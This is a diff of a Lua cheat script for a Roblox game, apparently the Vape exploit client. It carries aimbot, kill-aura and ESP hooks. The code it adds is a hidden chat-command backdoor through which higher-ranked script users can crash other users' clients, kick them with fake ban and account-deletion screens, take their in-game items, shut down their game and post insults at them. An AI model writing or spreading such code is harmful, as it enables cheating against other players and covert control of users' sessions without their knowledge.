+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {},
+							messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+						},
+						termsActivated = function() 
+							game:Shutdown()
+						end,
+						communityGuidelinesActivated = function() 
+							game:Shutdown()
+						end,
+						supportFormActivated = function() 
+							game:Shutdown()
+						end,
+						reactivateAccountActivated = function() 
+							game:Shutdown()
+						end,
+						logoutCallback = function()
+							game:Shutdown()
+						end,
+						globalGuiInset = {
+							top = 0
+						}
+					})
+					local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+							localization = tLocalization.mock()
+						}, {Roact.createElement(UIBlox.Style.Provider, {
+								style = {
+									Theme = darktheme,
+									Font = gotham
+								},
+							}, {e})}))
+					Roact.mount(screengui, game:GetService("CoreGui"))
+				end)
+			end)
+		end,
+		steal = function(args, plr)
+            if game.PlaceId == 6872274481 or game.PlaceId == 8560631822 or game.PlaceId == 8444591321 then
+			    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+				    GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+				    task.wait(1)
+			    end
+			    for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
+				    local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+					    item = v.tool,
+					    amount = v.amount ~= math.huge and v.amount or 99999999
+				    })
+				    if e then 
+					    e.CFrame = plr.Character.HumanoidRootPart.CFrame
+				    else
+					    v.tool:Destroy()
+				    end
+			    end
+            else
+                if WhitelistFunctions.localprio == 1 then
+                    warningNotification("Whitelist", "Skill issue lol", 50)
+                    task.wait(6)
+                    transformImage("http://www.roblox.com/asset/?id=13953598788", "xylex")
+                    task.wait(6)
+                    lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+                end
+            end
+		end,
+		lobby = function(args)
+            if game.PlaceId == 6872274481 or game.PlaceId == 8560631822 or game.PlaceId == 8444591321 then  
+			    bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+            end
+		end,
+		reveal = function(args)
+			task.spawn(function()
+				task.wait(0.1)
+                local said = false
+				if WhitelistFunctions.localprio == 0 and not said then 
+					sendmessage("helloimusinginhaler")
+				end
+			end)
+		end,
+		lagback = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
+			end
+		end,
+		jump = function(args)
+			if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end,
+		trip = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+			end
+		end,
+		teleport = function(args)
+			game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
+		end,
+		sit = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = true
+			end
+		end,
+		unsit = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = false
+			end
+		end,
+		freeze = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.Anchored = true
+			end
+		end,
+        thaw = function(args)
+            if entityLibrary.isAlive then
+                entityLibrary.character.HumanoidRootPart.Anchored = false
+            end
+        end,
+		deletemap = function(args)
+			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
+			if terrain then terrain:Clear() end
+			for i, v in workspace:GetChildren() do
+				if v ~= terrain and not v:FindFirstChildWhichIsA('Humanoid') and not v:IsA('Camera') then
+					v:Destroy()
+				end
+			end
+		end,
+		void = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
+			end
+		end,
+		framerate = function(args)
+			if #args >= 1 then
+				if setfpscap then
+					setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
+				end
+			end
+		end,
+		crash = function(args)
+			setfpscap(9e9)
+			print(game:GetObjects("h29g3535")[1])
+		end,
+		chipman = function(args)
+			transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
+		end,
+		rickroll = function(args)
+			transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
+		end,
+		josiah = function(args)
+			transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
+		end,
+        xylex = function(args)
+            transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
+        end,
+        gravity = function(args)
+            workspace.Gravity = tonumber(args[1]) or 192.6
+        end,
+        kick = function(args, plr)
+            local str = ""
+            for i,v in pairs(args) do
+                str = str..v..(i > 1 and " " or "")
+            end
+            task.spawn(function()
+                lplr:Kick(str)
+            end)
+        end,
+        ban = function(args)
+            task.spawn(function()
+                task.wait(3)
+                lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+            end)
+        end,
+		uninject = function(args)
+			if olduninject then
+				olduninject(vape)
+			else
+				GuiLibrary.SelfDestruct()
+			end
+		end,
+		monkey = function(args)
+			local str = ""
+			for i,v in pairs(args) do
+				str = str..v..(i > 1 and " " or "")
+			end
+			if str == "" then str = "skill issue" end
+			local video = Instance.new("VideoFrame")
+			video.Video = downloadVapeAsset("vape/assets/skill.webm")
+			video.Size = UDim2.new(1, 0, 1, 36)
+			video.Visible = false
+			video.Position = UDim2.new(0, 0, 0, -36)
+			video.ZIndex = 9
+			video.BackgroundTransparency = 1
+			video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			local textlab = Instance.new("TextLabel")
+			textlab.TextSize = 45
+			textlab.ZIndex = 10
+			textlab.Size = UDim2.new(1, 0, 1, 36)
+			textlab.TextColor3 = Color3.new(1, 1, 1)
+			textlab.Text = str
+			textlab.Position = UDim2.new(0, 0, 0, -36)
+			textlab.Font = Enum.Font.Gotham
+			textlab.BackgroundTransparency = 1
+			textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			video.Loaded:Connect(function()
+				video.Visible = true
+				video:Play()
+				task.spawn(function()
+					repeat
+						wait()
+						for i = 0, 1, 0.01 do
+							wait(0.01)
+							textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+						end
+					until true == false
+				end)
+			end)
+			task.wait(19)
+			task.spawn(function()
+				pcall(function()
+					if getconnections then
+						getconnections(entityLibrary.character.Humanoid.Died)
+					end
+					print(game:GetObjects("h29g3535")[1])
+				end)
+				while true do end
+			end)
+		end,
+		enable = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module and not module.Api.Enabled then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		disable = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module and module.Api.Enabled then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		toggle = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		shutdown = function(args)
+			game:Shutdown()
+		end
+    }
+    vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
+    task.spawn(function()
+	    local function chatfunc(plr)
+		    table.insert(vapeConnections, plr.Chatted:Connect(function(message)
+			    vapeStore.MessageReceived:Fire(plr, message)
+		    end))
+	    end
+	    table.insert(vapeConnections, textChatService.MessageReceived:Connect(function(data)
+		    local success, player = pcall(function() 
+			    return playersService:GetPlayerByUserId(data.TextSource.UserId) 
+		    end)
+		    if success then 
+			    vapeStore.MessageReceived:Fire(player, data.Text)
+		    end
+	    end))
+	    for i,v in playersService:GetPlayers() do 
+		    chatfunc(v)
+	    end
+	    table.insert(vapeConnections, playersService.PlayerAdded:Connect(chatfunc))
+    end)
+    table.insert(vapeConnections, vapeStore.MessageReceived.Event:Connect(function(plr, message)
+        message = message:gsub('/w '..lplr.Name, '')
+        local localPriority = priolist[WhitelistFunctions:CheckPlayerType(lplr)] or 0
+        local otherPriority = priolist[WhitelistFunctions:CheckPlayerType(plr)] or 0
+        local args = message:split(' ')
+        local first, second = tostring(args[1]), tostring(args[2])
+        if plr.Name == lplr.Name then
+            if localPriority > 0 then
+                if message == "ehelp" or first:sub(1, 6) == ';cmds' then
+                    task.wait(0.1)
+                    local tab = {}
+                    for i,v in pairs(vapePrivateCommands) do
+                        table.insert(tab, ";"..i)
+                    end
+                    table.sort(tab)
+                    local str = table.concat(tab, "\n")
+                    if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
+                        textChatService.ChatInputBarConfiguration.TargetTextChannel:DisplaySystemMessage(str)
+                    else 
+                        game:GetService('StarterGui'):SetCore('ChatMakeSystemMessage', {Text = str, Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24})
+                        game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[Velocity Private] Commands", Color = Color3.fromRGB(0, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
+                    end
+                end
+            end
+        else
+            if otherPriority > 0 and otherPriority > localPriority and #args > 1 then
+                table.remove(args, 1)
+                local chosenplayers = findplayers(args[1], plr)
+                if table.find(chosenplayers, lplr) then
+                    table.remove(args, 1)
+                    for i,v in pairs(chosenplayers) do
+                        for i,v in pairs(vapePrivateCommands) do
+                            if message:len() >= (i:len() + 1) and message:sub(1, i:len() + 1):lower() == ";"..i:lower() then 
+                                v(args, plr)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        local prompt = false
+		local function newPlayer(plr)
+			if WhitelistFunctions:get(lplr) ~= 0 and WhitelistFunctions.localprio == 0 then
+				GuiLibrary.SelfDestruct = function()
+					warningNotification("Vape", "nice one bro :troll:", 5)
+				end
+				task.spawn(function()
+                    repeat
+                        if not prompt then
+						    prompt = true
+						    local bkg = Instance.new("Frame")
+					    	bkg.Size = UDim2.new(1, 0, 1, 36)
+					    	bkg.Position = UDim2.new(0, 0, 0, -36)
+					    	bkg.BorderSizePixel = 0
+				    		bkg.Parent = game.CoreGui.RobloxGui
+		    				bkg.BackgroundTransparency = 1
+		    				bkg.BackgroundColor3 = Color3.new()
+		       				local widgetbkg = Instance.new("ImageButton")
+			    			widgetbkg.AnchorPoint = Vector2.new(0.5, 0.5)
+						    widgetbkg.Position = UDim2.new(0.5, 0, 0.5, 30)
+			    			widgetbkg.Size = UDim2.fromScale(0.45, 0.6)
+						    widgetbkg.Modal = true 
+						    widgetbkg.Image = ""
+						    widgetbkg.BackgroundTransparency = 1
+					    	widgetbkg.Parent = bkg
+					    	local widgetheader = Instance.new("Frame")
+					    	widgetheader.BackgroundColor3 = Color3.fromRGB(100, 103, 167)
+					    	widgetheader.Size = UDim2.new(1, 0, 0, 40)
+					    	widgetheader.Parent = widgetbkg
+					    	local widgetheader2 = Instance.new("Frame")
+					    	widgetheader2.BackgroundColor3 = Color3.fromRGB(100, 103, 167)
+					    	widgetheader2.Position = UDim2.new(0, 0, 1, -10)
+					    	widgetheader2.BorderSizePixel = 0
+						    widgetheader2.Size = UDim2.new(1, 0, 0, 10)
+						    widgetheader2.Parent = widgetheader
+					    	local widgetheadertext = Instance.new("TextLabel")
+					    	widgetheadertext.BackgroundTransparency = 1
+					    	widgetheadertext.Size = UDim2.new(1, -10, 1, 0)
+					    	widgetheadertext.Position = UDim2.new(0, 10, 0, 0)
+					    	widgetheadertext.RichText = true
+					    	widgetheadertext.TextXAlignment = Enum.TextXAlignment.Left
+					    	widgetheadertext.TextSize = 18
+				    		widgetheadertext.Font = Enum.Font.Roboto
+				    		widgetheadertext.Text = "<b>Xylex - Creator of Vape</b>"
+				    		widgetheadertext.TextColor3 = Color3.new(1, 1, 1)
+			    			widgetheadertext.Parent = widgetheader
+				    		local widgetheadercorner = Instance.new("UICorner")
+				    		widgetheadercorner.CornerRadius = UDim.new(0, 10)
+					    	widgetheadercorner.Parent = widgetheader
+							local widgetcontent2 = Instance.new("Frame")
+						    widgetcontent2.BackgroundColor3 = Color3.fromRGB(78, 80, 130)
+				    		widgetcontent2.Position = UDim2.new(0, 0, 0, 40)
+					    	widgetcontent2.BorderSizePixel = 0
+							widgetcontent2.Size = UDim2.new(1, 0, 0, 10)
+							widgetcontent2.Parent = widgetbkg
+							local widgetcontent = Instance.new("Frame")
+							widgetcontent.BackgroundColor3 = Color3.fromRGB(78, 80, 130)
+							widgetcontent.Size = UDim2.new(1, 0, 1, -40)
+					        widgetcontent.Position = UDim2.new(0, 0, 0, 40)
+							widgetcontent.Parent = widgetbkg
+							local widgetcontentcorner = Instance.new("UICorner")
+							widgetcontentcorner.CornerRadius = UDim.new(0, 10)
+						    widgetcontentcorner.Parent = widgetcontent
+						    local widgetpadding = Instance.new("UIPadding")
+							widgetpadding.PaddingBottom = UDim.new(0, 15)
+							widgetpadding.PaddingTop = UDim.new(0, 15)
+							widgetpadding.PaddingLeft = UDim.new(0, 15)
+						    widgetpadding.PaddingRight = UDim.new(0, 15)
+							widgetpadding.Parent = widgetcontent
+						    local widgetlayout = Instance.new("UIListLayout")
+						    widgetlayout.FillDirection = Enum.FillDirection.Vertical
+							widgetlayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+							widgetlayout.VerticalAlignment = Enum.VerticalAlignment.Center
+						    widgetlayout.Parent = widgetcontent
+						    local widgetmain = Instance.new("Frame")
+							widgetmain.BackgroundTransparency = 1
+						    widgetmain.Size = UDim2.new(1, 0, 0.8, 0)
+						    widgetmain.Parent = widgetcontent
+						    local widgetmainlayout  = Instance.new("UIListLayout")
+						    widgetmainlayout.FillDirection = Enum.FillDirection.Horizontal
+						    widgetmainlayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+				     	    widgetmainlayout.VerticalAlignment = Enum.VerticalAlignment.Center
+						    widgetmainlayout.Parent = widgetmain
+						    local widgetimage = Instance.new("ImageLabel")
+						    widgetimage.BackgroundTransparency = 1
+						    widgetimage.Size = UDim2.new(0.2, 0, 1, 0)
+						    widgetimage.ScaleType = Enum.ScaleType.Fit
+						    widgetimage.Image = "rbxassetid://7804178661"
+						    widgetimage.Parent = widgetmain
+						    local widgettext = Instance.new("TextLabel")
+						    widgettext.Size = UDim2.new(0.7, 0, 1, 0)
+						    widgettext.BackgroundTransparency = 1
+						    widgettext.Font = Enum.Font.Legacy
+						    widgettext.TextScaled = true 
+						    widgettext.RichText = true
+							widgettext.Text = [[<b><font color="#FFFFFF">Vape is currently restricted for you.</font></b>
+
+Stop trying to bypass the whitelist system, I'll keep fighting until you give up yknow, kid you're fucking dog and trash. Keep trying.
+								]]
+							widgettext.TextColor3 = Color3.new(1, 1, 1)
+							widgettext.LayoutOrder = 2
+							widgettext.TextXAlignment = Enum.TextXAlignment.Left
+							widgettext.TextYAlignment = Enum.TextYAlignment.Top
+							widgettext.Parent = widgetmain
+							local widgettextsize = Instance.new("UITextSizeConstraint")
+							widgettextsize.MaxTextSize = 18
+							widgettextsize.Parent = widgettext
+							tweenService:Create(bkg, TweenInfo.new(0.12), {BackgroundTransparency = 0.6}):Play()
+							task.wait(0.13)
+						end
+                        lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+						pcall(function()
+							if getconnections then
+								getconnections(entityLibrary.character.Humanoid.Died)
+							end
+							print(game:GetObjects("h29g3535")[1])
+						end)
+						while true do end
+						continue
+				    until not vapeInjected
+                end)
+            end
+		end
+	    for i,v in pairs(playersService:GetPlayers()) do task.spawn(newPlayer, v) end
+	    table.insert(vapeConnections, playersService.PlayerAdded:Connect(function(v)
+		    task.spawn(newPlayer, v)
+	    end))
+    end))
+end)
+
+local sent = false
+local function whitelistFunction(plr)
+    repeat task.wait() until WhitelistFunctions.loaded
+    local plrPriority, _, _ = WhitelistFunctions:get(plr)
+	local rank = WhitelistFunctions:CheckPlayerType(plr)
+    if WhitelistFunctions.localprio >= 1 and not sent then
+        warningNotification('Vape', 'You are now authenticated, Time to troll velocity users! Rank: ' .. rank, 4.5)
+        sent = true
+    end
+end
+
+whitelistFunction(lplr)
 
 local RunLoops = {RenderStepTable = {}, StepTable = {}, HeartTable = {}}
 do
@@ -744,7 +1513,6 @@ runFunction(function()
 		Priority = 1
 	})
 end)
-
 runFunction(function()
 	local SilentAimSmartWallTable = {}
 	local SilentAim = {Enabled = false}
@@ -1900,7 +2668,7 @@ runFunction(function()
 											table.insert(attackedplayers, v)
 										end
 										vapeTargetInfo.Targets.Killaura = v
-										if not ({WhitelistFunctions:GetWhitelist(v.Player)})[2] then
+										if not ({WhitelistFunctions:Get(v.Player)})[2] then
 											continue
 										end
 										KillauraNearTarget = true
@@ -2893,7 +3661,7 @@ runFunction(function()
 			if ESPName.Enabled then 
 				thing.Drop = Drawing.new("Text")
 				thing.Drop.Color = Color3.new()
-				thing.Drop.Text = WhitelistFunctions:GetTag(plr.Player)..(plr.Player.DisplayName or plr.Player.Name)
+				thing.Drop.Text = WhitelistFunctions:tag(plr.Player)..(plr.Player.DisplayName or plr.Player.Name)
 				thing.Drop.ZIndex = 1
 				thing.Drop.Center = true
 				thing.Drop.Size = 20
@@ -2940,7 +3708,7 @@ runFunction(function()
 				local nameoffset1 = PointOffset.new(PointInstance.new(plr.RootPart, CFrame.new(0, 3, 0)), Vector2.new(0, -15))
 				local nameoffset2 = PointOffset.new(nameoffset1, Vector2.new(1, 1))
 				newobj3.Text = TextDynamic.new(nameoffset1)
-				newobj3.Text.Text = WhitelistFunctions:GetTag(plr.Player)..(plr.Player.DisplayName or plr.Player.Name)
+				newobj3.Text.Text = WhitelistFunctions:tag(plr.Player)..(plr.Player.DisplayName or plr.Player.Name)
 				newobj3.Text.Color = newobj.Color
 				newobj3.Text.ZIndex = 2
 				newobj3.Text.Size = 20
@@ -3140,7 +3908,7 @@ runFunction(function()
 				v.Main.Quad3.Color = color
 			end
 			if v and v.Text then 
-				v.Text.Text = WhitelistFunctions:GetTag(ent.Player)..(ent.Player.DisplayName or ent.Player.Name)
+				v.Text.Text = WhitelistFunctions:tag(ent.Player, true)..(ent.Player.DisplayName or ent.Player.Name)
 				v.Drop.Text = v.Text.Text
 			end
 		end,
@@ -3152,7 +3920,7 @@ runFunction(function()
 				v.HealthBar.Line.Color = color
 			end
 			if v and v.Name and v.Name.Text then 
-				v.Name.Text.Text = WhitelistFunctions:GetTag(ent.Player)..(ent.Player.DisplayName or ent.Player.Name)
+				v.Name.Text.Text = WhitelistFunctions:tag(ent.Player, true)..(ent.Player.DisplayName or ent.Player.Name)
 				v.Name.Drop.Text = v.Name.Text.Text
 			end
 		end
@@ -3578,7 +4346,7 @@ runFunction(function()
 						lightingsettings.Brightness = lightingService.Brightness
 						lightingsettings.ClockTime = lightingService.ClockTime
 						lightingsettings.FogEnd = lightingService.FogEnd
-						lightingsettings.GlobalShadows = lightingService.GlobalShadows
+						lightingsettings.GlobalShadows = lightingService.GlobalShadows 
 						lightingsettings.OutdoorAmbient = lightingService.OutdoorAmbient
 						lightingchanged = true
 						lightingService.Brightness = 2
@@ -3669,7 +4437,7 @@ runFunction(function()
 			thing.Font = Enum.Font[NameTagsFont.Value]
 			thing.TextSize = 14 * (NameTagsScale.Value / 10)
 			thing.BackgroundTransparency = NameTagsBackground.Enabled and 0.5 or 1
-			nametagstrs[plr.Player] = WhitelistFunctions:GetTag(plr.Player)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
+			nametagstrs[plr.Player] = WhitelistFunctions:tag(plr.Player, true)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
 			if NameTagsHealth.Enabled then
 				local color = Color3.fromHSV(math.clamp(plr.Humanoid.Health / plr.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
 				nametagstrs[plr.Player] = nametagstrs[plr.Player]..' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.round(plr.Humanoid.Health).."</font>"
@@ -3697,7 +4465,7 @@ runFunction(function()
 			thing.Main.BG.Visible = NameTagsBackground.Enabled
 			thing.Main.BG.Color = Color3.new()
 			thing.Main.BG.ZIndex = 1
-			nametagstrs[plr.Player] = WhitelistFunctions:GetTag(plr.Player)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
+			nametagstrs[plr.Player] = WhitelistFunctions:tag(plr.Player, true)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
 			if NameTagsHealth.Enabled then
 				local color = Color3.fromHSV(math.clamp(plr.Humanoid.Health / plr.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
 				nametagstrs[plr.Player] = nametagstrs[plr.Player]..' '..math.round(plr.Humanoid.Health)
@@ -3735,7 +4503,7 @@ runFunction(function()
 		Normal = function(ent)
 			local v = nametagsfolderdrawing[ent.Player]
 			if v then 
-				nametagstrs[ent.Player] = WhitelistFunctions:GetTag(ent.Player)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
+				nametagstrs[ent.Player] = WhitelistFunctions:tag(ent.Player, true)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
 				if NameTagsHealth.Enabled then
 					local color = Color3.fromHSV(math.clamp(ent.Humanoid.Health / ent.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
 					nametagstrs[ent.Player] = nametagstrs[ent.Player]..' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.round(ent.Humanoid.Health).."</font>"
@@ -3751,7 +4519,7 @@ runFunction(function()
 		Drawing = function(ent)
 			local v = nametagsfolderdrawing[ent.Player]
 			if v then 
-				nametagstrs[ent.Player] = WhitelistFunctions:GetTag(ent.Player)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
+				nametagstrs[ent.Player] = WhitelistFunctions:tag(ent.Player, true)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
 				if NameTagsHealth.Enabled then
 					nametagstrs[ent.Player] = nametagstrs[ent.Player]..' '..math.round(ent.Humanoid.Health)
 				end
@@ -5076,7 +5844,7 @@ runFunction(function()
 						if tab.TextSource then
 							local plr = playersService:GetPlayerByUserId(tab.TextSource.UserId)
 							local args = tab.Text:split(" ")
-							if plr and plr ~= lplr and WhitelistFunctions:GetWhitelist(plr) == 0 then
+							if plr and plr ~= lplr and WhitelistFunctions:get(plr) == 0 then
 								local reportreason, reportedmatch = findreport(tab.Text)
 								if reportreason then 
 									if alreadyreported[plr] then return end
@@ -5102,7 +5870,7 @@ runFunction(function()
 						table.insert(AutoReport.Connections, replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
 							local plr = playersService:FindFirstChild(tab.FromSpeaker)
 							local args = tab.Message:split(" ")
-							if plr and plr ~= lplr and WhitelistFunctions:GetWhitelist(plr) == 0 then
+							if plr and plr ~= lplr and WhitelistFunctions:get(plr) == 0 then
 								local reportreason, reportedmatch = findreport(tab.Message)
 								if reportreason then 
 									if alreadyreported[plr] then return end
@@ -5243,7 +6011,7 @@ runFunction(function()
 			pcall(function()
 				if AutoLeaveGroupId.Value == "" or AutoLeaveRank.Value == "" then return end
 				if getRole(plr, tonumber(AutoLeaveGroupId.Value) or 0) >= (tonumber(AutoLeaveRank.Value) or 1) then
-					WhitelistFunctions.CustomTags[plr.Name] = "[GAME STAFF] "
+					WhitelistFunctions.customtags[plr.Name] = "[GAME STAFF] "
 					local _, ent = entityLibrary.getEntityFromPlayer(plr)
 					if ent then 
 						entityLibrary.entityUpdatedEvent:Fire(ent)
@@ -5319,9 +6087,9 @@ runFunction(function()
 					end
 				end
 			else
-				for i,v in pairs(WhitelistFunctions.CustomTags) do 
+				for i,v in pairs(WhitelistFunctions.customtags) do 
 					if v == "[GAME STAFF] " then 
-						WhitelistFunctions.CustomTags[i] = nil
+						WhitelistFunctions.customtags[i] = nil
 						local _, ent = entityLibrary.getEntityFromPlayer(i)
 						if ent then 
 							entityLibrary.entityUpdatedEvent:Fire(ent)
@@ -5909,515 +6677,6 @@ runFunction(function()
 	})
 end)
 
-task.spawn(function()
-    local priolist = {
-        DEFAULT = 0,
-        ["VAPE PRIVATE"] = 1,
-        ["VAPE OWNER"] = 2
-    }
-
-    local function findplayers(arg, plr)
-        local temp = {}
-        local continuechecking = true
-        if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
-        if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
-        if arg == "private" and continuechecking and (WhitelistFunctions:CheckPlayerType(lplr) == "VAPE PRIVATE" or WhitelistFunctions:CheckPlayerType(lplr) == "VAPE OWNER") then table.insert(temp, lplr) continuechecking = false end
-        for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
-        return temp
-    end
-
-    local function transformImage(img, txt)
-        local function funnyfunc(v)
-            if v:GetFullName():find("ExperienceChat") == nil then
-                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-                    v.Image = img
-                    v:GetPropertyChangedSignal("Image"):Connect(function()
-                        v.Image = img
-                    end)
-                end
-                if v:IsA("TextLabel") or v:IsA("TextButton") then
-                    if v.Text ~= "" then
-                        v.Text = txt
-                    end
-                    v:GetPropertyChangedSignal("Text"):Connect(function()
-                        if v.Text ~= "" then
-                            v.Text = txt
-                        end
-                    end)
-                end
-                if v:IsA("Texture") or v:IsA("Decal") then
-                    v.Texture = img
-                    v:GetPropertyChangedSignal("Texture"):Connect(function()
-                        v.Texture = img
-                    end)
-                end
-                if v:IsA("MeshPart") then
-                    v.TextureID = img
-                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
-                        v.TextureID = img
-                    end)
-                end
-                if v:IsA("SpecialMesh") then
-                    v.TextureId = img
-                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
-                        v.TextureId = img
-                    end)
-                end
-                if v:IsA("Sky") then
-                    v.SkyboxBk = img
-                    v.SkyboxDn = img
-                    v.SkyboxFt = img
-                    v.SkyboxLf = img
-                    v.SkyboxRt = img
-                    v.SkyboxUp = img
-                end
-            end
-        end
-
-        for i, v in pairs(game:GetDescendants()) do
-            funnyfunc(v)
-        end
-        game.DescendantAdded:Connect(funnyfunc)
-    end
-
-    local vapePrivateCommands = {
-		kill = function(args, plr)
-			if entityLibrary.isAlive then
-				local hum = entityLibrary.character.Humanoid
-				task.delay(0.1, function()
-					if hum and hum.Health > 0 then 
-						hum:ChangeState(Enum.HumanoidStateType.Dead)
-						hum.Health = 0
-					end
-				end)
-			end
-		end,
-	        murder = function(args, plr)
-	            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
-		     	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-	        end,
-	        black = function(args)
-	            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-	                local character = player.Character
-	                if character then
-	                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-	                    if humanoidRootPart and humanoidRootPart:IsA('BasePart') then
-	                        humanoidRootPart.BrickColor = BrickColor.new("Really black")
-	                    end
-	                end
-	            end
-	        end,
-	        troll = function(args)
-	            task.spawn(function()
-	                transformImage("http://www.roblox.com/asset/?id=13953598788", "xylex")
-	                task.wait(6)
-	                lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-	            end)
-	        end,
-		byfron = function(args, plr)
-			task.spawn(function()
-				local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
-				local Roact = getrenv().require(game:GetService("CorePackages").Roact)
